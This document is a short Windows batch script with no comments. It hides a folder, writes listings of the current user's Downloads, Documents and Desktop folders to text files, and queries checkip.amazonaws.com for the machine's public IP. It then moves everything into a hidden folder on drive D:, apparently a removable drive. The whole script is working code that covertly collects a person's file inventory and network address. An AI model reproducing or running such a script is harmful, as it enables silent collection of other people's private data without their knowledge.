@echo off

cd ..
attrib +h %USERNAME%DATA 
cd %USERNAME%DATA
attrib +h *

mkdir %username%files
mkdir %USERNAME%INFO
cd %USERNAME%INFO

C:

cd Users\%username%


dir Downloads > %USERNAME%DOWNLOADS.TXT
move %USERNAME%DOWNLOADS.TXT D:


dir Documents > %USERNAME%DOCUMENTS.TXT
move %USERNAME%DOCUMENTS.TXT D:


dir Desktop > %USERNAME%DESKTOP.TXT
move %USERNAME%DESKTOP.TXT D:


curl checkip.amazonaws.com > %USERNAME%IPADRRESS.TXT
move %USERNAME%IPADRRESS.TXT D:

D:

move *.txt D:\DATA\%USERNAME%DATA\%USERNAME%INFO


exit

